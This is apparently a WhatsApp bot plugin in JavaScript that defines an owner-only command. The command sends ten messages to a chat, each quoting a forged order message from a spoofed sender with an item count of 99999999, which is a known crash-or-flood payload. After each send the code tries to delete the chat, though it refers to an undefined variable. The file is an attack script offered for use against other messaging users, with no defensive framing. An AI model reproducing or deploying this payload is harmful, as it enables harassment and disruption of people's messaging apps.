let handler  = async (m, { conn, text }) => {
  const delay = time => new Promise(res=>setTimeout(res,time));
  for (i=0;i<10;i++){
    conn.sendFile(m.chat, 'https://asset.kompas.com/crops/AOqycoSV_pH5eU51rYStWW_zVFY=/1x0:1000x666/750x500/data/photo/2019/11/04/5dbfff829ebe6.jpg', 'eror.jpg', '', {
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
      }, message: {
        orderMessage: {
          itemCount: 99999999,
          orderTitle: '',
          sellerJid: '0@s.whatsapp.net',
          jpegThumbnail: ''
        }
      }
    })
    await conn.modifyChat(id, 'delete').catch(console.log)
    await delay(2000)
  }
}
handler.help = []
handler.tags = []
handler.command = /^(salkeen)$/i
handler.owner = true
module.exports = handler